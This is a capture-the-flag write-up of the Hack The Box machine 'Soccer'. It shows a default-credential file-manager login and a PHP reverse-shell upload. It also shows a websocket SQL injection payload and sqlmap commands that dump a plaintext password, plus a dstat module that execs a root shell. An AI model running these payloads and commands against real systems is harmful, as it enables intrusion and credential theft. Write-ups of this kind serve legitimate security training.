---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Soccer

## Enumeration

### Nmap

sudo nmap -sV 10.10.11.194

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-31 06:19 EDT
Nmap scan report for 10.10.11.194
Host is up (0.078s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?

1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9091-TCP:V=7.93%I=7%D=3/31%Time=6426B3AE%P=x86_64-pc-linux-gnu%r(in
SF:formix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r
...ETC...ETC...
SF:20Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

* The 9091 is a webserver that accepts web socket connections.

## Gobuster

```bash
# gobuster is not installed by default on Kali
gobuster dir -u http://soccer.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Found Tiny file manager http://soccer.htb/tiny/**

Default credentials `admin:admin@123` from documentation on https://github.com/prasathmani/tinyfilemanager#how-to-use

We can upload PHP scripts

1. change to directory tiny/uploads/
2. click upload button in the top-right corner
3. upload php reverse shell
4. we get user `www-data`

## Linpeas

```
╔══════════╣ Checking doas.conf
permit nopass player as root cmd /usr/bin/dstat  
```

That should be the way for the root

## Manual search

There is another subdomain **http://soc-player.soccer.htb** that the subdomain that's the websockets are for this domain uses websockets on soccer.htb:9091

The websocket endpoint is vulnerable to boolean based sql injection

```
{"id":"097 OR 1=1"}
```

Sqlmap has no support for ws but this helped **https://github.com/BKreisel/sqlmap-websocket-proxy**

run it with this command `sqlmap-websocket-proxy -u ws://soccer.htb:9091 -p '{"id": "%param%"}' --json -o 7070`

sqlmap command: `sqlmap -u http://localhost:7070/\?param1\=1 --dump --technique B --risk 3` `dump` dupms the tables `B` means booleand-based SQLinjection `risk` is there to use aggressive queries/strategy

Table: accounts

```
[1 entry]
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+
```

password is reused by the player on `ssh player@soccer.htb`

## root

linpeas earlier returned that the `doas` command allows the player to run `dstat` as root. according to GTFObins **https://gtfobins.github.io/gtfobins/dstat/** dstat can be run using arbitrary user supplied modules so we followed

Note that it is important to run the command from the `/usr/local/share/dstat` directory

```sh
mkdir -p ~/.dstat
echo 'import os; os.execv("/bin/sh", ["sh"])' > /usr/local/share/dstat/dstat_evil.py
dstat --evil
```